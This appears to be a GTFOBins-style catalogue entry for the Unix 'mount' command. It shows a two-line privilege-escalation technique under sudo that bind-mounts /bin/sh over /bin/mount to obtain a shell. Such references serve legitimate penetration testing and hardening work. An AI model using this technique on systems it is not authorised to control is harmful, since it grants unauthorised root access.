---
type: gtfobin
name: mount
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# mount

## privilege-escalation

```bash
mount -o bind /bin/sh /bin/mount
mount
```
_This overrides `mount` itself with a shell (or any other executable)._
**Contexts:** sudo
